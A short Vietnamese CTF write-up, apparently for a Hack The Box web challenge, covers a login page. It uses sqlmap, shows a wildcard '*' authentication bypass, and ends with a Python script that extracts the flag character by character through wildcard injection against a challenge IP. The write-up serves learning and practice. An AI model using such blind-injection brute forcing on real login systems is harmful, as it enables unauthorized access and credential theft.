![image](https://github.com/user-attachments/assets/c481c7a1-45be-4223-b4b1-35309d81cc66)

Giao diện là login:

![image](https://github.com/user-attachments/assets/69c26dc3-a2d2-4e09-accf-9d3441ed3424)

Sau khi login có quả `message=Authentication%20failed`, sẽ ra sao nếu tôi đổi sang true?

![image](https://github.com/user-attachments/assets/55831f36-6725-4db0-bf9c-be565748578f)

Sau khi fuzz thì không thấy có kết quả gì dùng được

![image](https://github.com/user-attachments/assets/e695947a-8209-4098-9180-e98645e76819)

Tôi nghi là liên quan đến sqli nên treo tạm cái sqlmap:

![image](https://github.com/user-attachments/assets/d74ce5ec-e458-4e4c-8931-13b08c80280f)

Vì cũng có thể là nosql nên tôi thử * và ở cả username và password:

![image](https://github.com/user-attachments/assets/1ecd95d8-f899-4642-a328-51bf51157b62)

Nó ra cái cookie gì đó:

![image](https://github.com/user-attachments/assets/bc1db90b-2c6d-4238-b5a0-12d57fd8839f)

Đi theo thì ra cái này:

![image](https://github.com/user-attachments/assets/f9f256f0-656a-4ad5-a4f3-2151e68cf4cf)

![image](https://github.com/user-attachments/assets/7a33ef4a-0500-4521-86c9-4a7dabbcda6b)

Dùng thử tính năng search thì có vẻ lại là sqli và có vẻ là nosqli:

![image](https://github.com/user-attachments/assets/f68816ea-b19e-4204-bdb4-28babd126766)

Sau 1 lúc mò mẫm thì chả ra cái gì quan trọng ở đây, chỉ là các thông tin chứ không thấy flag, tôi nghĩ có vẻ password hoặc username sẽ là flag

![image](https://github.com/user-attachments/assets/d514114b-6379-4299-989c-a502976d8baa)

Nhìn chữ H là có vẻ chuẩn flag đấy:

![image](https://github.com/user-attachments/assets/8ecf3b29-86ca-4ee3-a551-bb998d03da95)

![image](https://github.com/user-attachments/assets/ac932f8c-723c-42e3-a5cc-448106d02b8f)

Tôi viết 1 đoạn code python be bé:

![image](https://github.com/user-attachments/assets/ace80320-2831-44c3-80c2-688a042126dc)

```
import requests

password = ""
chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&+,-./:;<=>?@[]^_`{|}~"

url = "http://94.237.55.185:50677/login"

for index in range(1, 50):
    for char in chars:
        test_password = f"HTB{{{password}{char}*}}"
        data = {"username": "*", "password": test_password}

        response = requests.post(url, data=data)

        print(f"Testing: {test_password}", end="\r")

        if "You can now login using the workstation username and password" not in response.text:
            password += char
            print(f"\nFound: {password}")
            break
```





